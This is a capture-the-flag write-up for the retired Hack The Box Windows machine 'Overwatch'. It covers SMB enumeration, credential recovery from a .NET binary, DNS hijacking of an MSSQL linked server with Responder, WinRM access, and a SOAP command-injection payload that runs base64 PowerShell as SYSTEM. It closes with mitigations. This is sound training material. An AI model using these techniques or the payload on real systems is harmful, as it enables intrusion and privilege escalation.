---
machine: Overwatch
os: Windows
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [windows, active-directory, smb, dotnet, mssql, wcf, dns, privesc]
---

# Overwatch — Hack The Box (Windows)

[🇪🇸 Español](README.md) | **English**

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

An anonymous SMB share holds a .NET monitoring binary. Reverse engineering recovers MSSQL credentials and a WCF service with a command-injection sink. A linked server points to a host that does not resolve; `CREATE_CHILD` on the AD DNS zone adds a record, captures SQL authentication with Responder and opens WinRM. The WCF `KillProcess` command on localhost runs as SYSTEM.

## Recon

```bash
nmap -Pn -sCV -p53,88,135,139,389,445,464,636,3268,3389,5985,6520,9389 <IP>
```

- The host is an `overwatch.htb` DC with SMB, LDAP, Kerberos, RDP and WinRM.
- `6520` is a Microsoft SQL Server 2022 instance.
- `netexec smb <IP> -u guest -p '' --shares` shows an anonymously accessible software share.

## Enumeration

- The share contains `Monitor.exe`, a .NET monitoring tool.
- `dotPeek` reveals SQL Server credentials and the WCF service URL.
- The WCF exposes `KillProcess`, which passes the process name to PowerShell.

```bash
smbclient //<IP>/Software -N
dotpeek Monitor.exe
```

## Foothold

With the MSSQL credentials, enumerate linked servers. One points to a name that does not resolve; the account has `CREATE_CHILD` on the AD-integrated DNS zone. Add an A record to the attacker and run Responder to capture the cleartext SQL authentication when the linked server connects.

```sql
EXEC sp_linkedservers;
EXEC ('SELECT 1') AT [LINKED];
```

## Lateral movement

The captured credentials belong to a `Remote Management Users` member; WinRM gives a shell. From there, enumerate the localhost WCF and identify its methods and SOAP format.

```bash
evil-winrm -i <IP> -u <USER> -p '<PASSWORD>'
```

## Privilege escalation

Invoke `KillProcess` over SOAP against `localhost:8000`; the parameter is concatenated into a PowerShell command running as SYSTEM. Send a reverse shell or add the user to Administrators.

```text
POST /MonitorService/ HTTP/1.1
SOAPAction: "http://tempuri.org/IMonitoringService/KillProcess"
<processName>x; powershell -e <BASE64>; #</processName>
```

## Evidence

- Anonymous SMB share and .NET binary.
- MSSQL credentials and linked server.
- Added DNS record and Responder capture.
- WinRM as a management user.
- WCF `KillProcess` and SYSTEM.

## Lessons learned

- An anonymous share with internal binaries leaks credentials and contracts.
- A linked server that does not resolve can be redirected by controlling DNS.
- `CREATE_CHILD` on an AD-integrated zone hijacks names.
- A local WCF with command injection is SYSTEM when the service runs as SYSTEM.

## Mitigation and detection

- Disable anonymous share access and keep credentials out of binaries.
- Restrict `CREATE_CHILD` and audit DNS zone changes.
- Sign and validate SQL authentication; never send cleartext credentials.
- Parameterize the WCF and run it under a least-privilege service account.

## References

- [0xdf — Overwatch](https://0xdf.gitlab.io/2026/05/09/htb-overwatch.html)
- [IppSec — Overwatch](https://www.youtube.com/watch?v=zOK_EzOyMN0)
- [Hack The Box — Overwatch](https://app.hackthebox.com/machines/overwatch)
